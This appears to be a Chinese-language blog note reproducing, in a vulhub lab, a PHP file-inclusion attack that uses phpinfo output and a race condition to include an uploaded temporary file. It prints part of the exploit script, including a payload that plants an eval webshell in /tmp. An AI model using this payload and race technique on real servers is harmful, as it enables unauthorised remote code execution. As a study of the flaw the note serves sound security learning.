---
title: PHP文件包含漏洞（利用phpinfo）
date: 2023-09-03T15:29:52+08:00
updated: 2023-08-05T16:40:28+08:00
categories: 
- 渗透测试
- 漏洞复现
- Php
---

### 漏洞简介:

PHP文件包含漏洞中，如果找不到可以包含的文件，我们可以通过包含临时文件的方法来getshell。因为临时文件名是随机的，如果目标网站上存在phpinfo，则可以通过phpinfo来获取临时文件名，进而进行包含。

### 漏洞利用:

直接使用vulhub中带的exp即可获得文件包含点getshell

![inclusion-1](E:\笔记软件\笔记\渗透测试\漏洞复现\Php\inclusion-1.png)

利用文件包含漏洞即可getshell

![includsion-2](E:\笔记软件\笔记\渗透测试\漏洞复现\Php\includsion-2.png)

### 漏洞分析：

该漏洞不限制版本，来源于服务器配置错误和LFI漏洞，Gynvael Coldwind在论文研究中特别指出如果在 PHP 配置文件中设置了 file_uploads = on，那么 PHP 将接受任何 PHP 文件的文件上传帖子。他还指出，上传文件将存储在 tmp 位置，直到请求的 PHP 页面被完全处理。

在给PHP发送POST数据包时，如果数据包里包含文件区块，无论你访问的代码中有没有处理文件上传的逻辑，PHP都会将这个文件保存成一个临时文件（通常是`/tmp/php[6个随机字符]`），文件名可以在`$_FILES`变量中找到。这个临时文件，在请求结束后就会被删除。

同时，因为phpinfo页面会将当前请求上下文中所有变量都打印出来，所以我们如果向phpinfo页面发送包含文件区块的数据包，则即可在返回包里找到`$_FILES`变量的内容，自然也包含临时文件名。

![inclusion-3](E:\笔记软件\笔记\渗透测试\漏洞复现\Php\inclusion-3.png)

可以看到phpinfo中存在临时文件名，该漏洞先向phpinfo发送垃圾数据和请求，得到文件名后再进行包含，但是通常请求phpinfo后文件数据就被删除了，因此需要条件竞争，利用流程如下

```
发送包含webshell的上传数据包给phpinfo页面，这个数据包的header、get等位置需要塞满垃圾数据

因为phpinfo页面会将所有数据都打印出来，1中的垃圾数据会将整个phpinfo页面撑得非常大

php默认的输出缓冲区大小为4096，可以理解为php每次返回4096个字节给socket连接

所以，我们直接操作原生socket，每次读取4096个字节。只要读取到的字符里包含临时文件名，就立即发送第二个数据包

此时，第一个数据包的socket连接实际上还没结束，因为php还在继续每次输出4096个字节，所以临时文件此时还没有删除

利用这个时间差，第二个数据包，也就是文件包含漏洞的利用，即可成功包含临时文件，最终getshell
```

通过观察脚本，也能看出来是这个逻辑

```python
def setup(host, port):
    TAG="Security Test"
    PAYLOAD="""%s\r
<?php file_put_contents('/tmp/g', '<?=eval($_REQUEST[1])?>')?>\r""" % TAG
    REQ1_DATA="""-----------------------------7dbff1ded0714\r
Content-Disposition: form-data; name="dummyname"; filename="test.txt"\r
Content-Type: text/plain\r
\r
%s
-----------------------------7dbff1ded0714--\r""" % PAYLOAD
    padding="A" * 5000
    REQ1="""POST /phpinfo.php?a="""+padding+""" HTTP/1.1\r
Cookie: PHPSESSID=q249llvfromc1or39t6tvnun42; othercookie="""+padding+"""\r
HTTP_ACCEPT: """ + padding + """\r
HTTP_USER_AGENT: """+padding+"""\r
HTTP_ACCEPT_LANGUAGE: """+padding+"""\r
HTTP_PRAGMA: """+padding+"""\r
Content-Type: multipart/form-data; boundary=---------------------------7dbff1ded0714\r
Content-Length: %s\r
Host: %s\r
\r
%s""" %(len(REQ1_DATA),host,REQ1_DATA)
    #modify this to suit the LFI script   
    LFIREQ="""GET /lfi.php?file=%s HTTP/1.1\r
User-Agent: Mozilla/4.0\r
Proxy-Connection: Keep-Alive\r
Host: %s\r
\r
\r
"""
    return (REQ1, TAG, LFIREQ)
```

如果有需要可以在脚本中更改漏洞利用位置和页面